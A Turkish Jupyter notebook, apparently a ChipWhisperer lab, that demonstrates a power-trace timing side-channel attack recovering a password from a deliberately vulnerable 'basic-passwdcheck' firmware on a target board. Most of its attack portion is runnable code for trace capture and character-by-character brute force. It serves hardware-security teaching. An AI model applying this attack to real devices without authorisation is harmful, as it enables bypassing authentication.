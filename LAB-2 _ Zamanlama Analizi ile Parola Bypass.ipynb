{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bir cihazın belirli işlemleri ne zaman gerçekleştireceğini belirlemek/bilmek cihazın güvenliğini aşmamıza yardımcı olabilmektedir. Bu örnekte, zamanlama saldırıları gerçekleştirmek için güç izi ile yan kanal analizinin nasıl kullanıldığı gösterilecektir. Basit parola tabanlı güvenlik sistemine sahip bir hedef kartın güvenliğini kırmaya çalışacağız. Bunun için basit bir parola kontrolü sağlayan firmware kullanacak ve temel bir güç analizinin nasıl yapıldığını göstereceğiz."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEXMEGA'\n",
    "CRYPTO_TARGET = 'NONE'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "API içerisinde bulunan hazır programı kullanacağız. -> basic-passwdcheck"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\"\n",
    "cd ../hardware/victims/firmware/basic-passwdcheck\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Helper_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "cw.program_target(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hedef karta yüklediğimiz ürün yazılımı temel bir parola kontrolü uygular. Bir '\\ n' ile sonlandırılmış parola aldıktan sonra, hedef kart onu kontrol eder ve sonsuz bir döngüye girer, bu yüzden onunla iletişim kurmadan önce sıfırlamamız gerekir. \n",
    "\n",
    "Sıfırlama işlemini çok yapacağımız için hedef kartı sıfırlayan bir fonksiyon tanımlıyoruz:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def reset_target(scope):\n",
    "    if PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.pdic = 'high'\n",
    "        time.sleep(0.05)\n",
    "    else:\n",
    "        scope.io.nrst = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = 'high'\n",
    "        time.sleep(0.05)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hedef kart, işlem başladığı zaman bize bir miktar metin gönderir. Aşağıdaki bloğu çalıştırdıktan sonra bir metin görmeliyiz.\n",
    "\n",
    "Not: Metin, veri kaybıyla ilgili bir mesajla birlikte kesikli olarak görünebilir. Bu, seri veriyi (128 bayt) hedef kartta saklamak için kullanılan buffer'ın dolu olduğu anlamına gelir. Bu mesaj bu işlemde bizim için sorun oluşturmaz sadece bilgilendirmedir."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ret = \"\"\n",
    "reset_target(scope)\n",
    "\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    ret += target.read(timeout=10)\n",
    "    time.sleep(0.05)\n",
    "    num_char = target.in_waiting()\n",
    "\n",
    "print(ret)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Şimdi hedef karta bir parola gönderelim."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "target.flush() #Removes all data from the serial buffer.\n",
    "target.write(\"h0px3\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hedef kartın yanıtını inceleyelim. Eğer parolamız doğru ise “Access granted, Welcome!” mesajı görülecektir."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(target.read(timeout=100))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Kayıt İzleri</b>\n",
    "\n",
    "Artık güvenli sistemimizle iletişim kurabildiğimize göre, bir sonraki hedefimiz hedef kart çalışırken güç izini sürmektir. Bunu yapmak için, parola denemesi göndermeden hemen önce scope'u kuracağız, ardından izi daha önce yaptığımız gibi kaydedeceğiz."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"CWNANO\":\n",
    "    scope.adc.samples = 800\n",
    "else:\n",
    "    scope.adc.samples = 1000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ret = \"\"\n",
    "reset_target(scope)\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    ret += target.read(timeout=10)\n",
    "    time.sleep(0.01)\n",
    "    num_char = target.in_waiting()\n",
    "\n",
    "print(ret)\n",
    "scope.arm()\n",
    "target.flush()\n",
    "target.write(\"h0px3\\n\")\n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print('Timeout happened during acquisition')\n",
    "\n",
    "trace = scope.get_last_trace()\n",
    "resp = \"\"\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    resp += target.read(timeout=10)\n",
    "    time.sleep(0.01)\n",
    "    num_char = target.in_waiting()\n",
    "print(resp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Şimdi sisteme ait bir güç izimiz var, bokeh kullanarak çizdirelim:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show\n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "\n",
    "output_notebook()\n",
    "p = figure()\n",
    "x_range = range(0, len(trace))\n",
    "p.line(x_range, trace)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Zamanlama Analizi</b>\n",
    "\n",
    "Artık güç izini yakalayabildiğimiz için, saldırımızı planlayabiliriz. İlk önce, bir şifre tahmin edip bir güç izi döndürme fonksiyonu yapacağız, çünkü bu adımı parolayı kırmak için çok tekrarlayacağız:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    scope.arm()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    return trace"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Şimdi iki farklı şifre deneyeceğiz ve güç izlerinin uzunluğa göre değişip değişmediğini göreceğiz. Daha sonra her iki izi de aynı şekilde çizdireceği ve farkı inceleyeceğiz."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trace = cap_pass_trace(\"\\n\")\n",
    "new_trace = cap_pass_trace(\"h\\n\")\n",
    "newest_trace = cap_pass_trace(\"a\\n\")\n",
    "newer_trace = cap_pass_trace(\"b\\n\")\n",
    "x_range = range(0, len(new_trace))\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(x_range, new_trace)\n",
    "p.line(x_range, trace, line_color='red')\n",
    "p.line(x_range, newest_trace, line_color='yellow')\n",
    "p.line(x_range, newer_trace, line_color='black')\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Her iki iz de benzer şekilde başlayıp bitmeliydi, ancak bazı yerlerde farklılık gösterdi. Mavi izin başlangıçta kırmızı iz gibi göründüğünü ancak zaman içinde değiştiğini görüyoruz. Bu zamanlama farkını şifreyi kırmak için kullanacağız.\n",
    "\n",
    "Farklı uzunluklarda ve doğru karakter sayısında güç izinin nasıl değiştiğini görmek için de yukarıdaki kodu farklı şifreleri deneyerek düzenleyebiliriz."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Tek Harfe Saldırma</b>\n",
    "\n",
    "Şimdi, ayırt edici bir zamanlama farkı tespit ettikten sonra, saldırımızı oluşturmaya başlayabiliriz. Tek bir harfle başlayacağız, çünkü bu bize saldırı hakkında biraz geri bildirimde bulunacaktır.\n",
    "\n",
    "Saldırı planı basit: orijinal konumdaki ayırt edici sivri uçları görene kadar harfleri tahmin etmeye devam edeceğiz. Bunu yapmak için şu döngüyü oluşturacağız:\n",
    "\n",
    "-Bir sonraki tahmini belirtin\n",
    "\n",
    "-İzi yakala ve kaydet\n",
    "\n",
    "-İzdeki 81 noktasının -0,15'den büyük olup olmadığını kontrol et\n",
    "\n",
    "81 indisli izi grafiği inceleyerek seçtik. en uzun sivri uca bakarak mavi kırmızının anlık yükseldiği değeri bulduk. Kırmızının değerini koda yazdık ve mavi ile aralarındaki farkı artış miktarını göstermesi için fonksiyon içerisine parametre olarak koyduk. İzin değeri -0,15'den küçük olduğu için o değerden büyük olan izi doğru kabul ederek parola harfi tahmini yaptık.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def checkpass(trace, i):\n",
    "    return trace[82 + 36 * i] > -0.15\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "for c in trylist:\n",
    "    next_pass = password + c + \"\\n\"\n",
    "    trace = cap_pass_trace(next_pass)\n",
    "    if checkpass(trace, 0):\n",
    "        print(\"Success: \" + c)\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Parolanın Tamamına Saldırmak</b>\n",
    "\n",
    "Artık tek bir karakter tahmin edebildiğimize göre, parolanın tamamını elde etmek için işlerimiz kolaylaştı. Bunun için bir önceki işlemi başka bir döngüde tekrarlamamız, kontrol noktasını taşımamız ve tahminimizi yeni doğru harfle güncellememiz gerekir."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "for i in range(5):\n",
    "    for c in trylist:\n",
    "        next_pass = password + c + \"\\n\"\n",
    "        trace = cap_pass_trace(next_pass)\n",
    "        if checkpass(trace, i):\n",
    "            password += c\n",
    "            print(\"Success, pass now {}\".format(password))\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
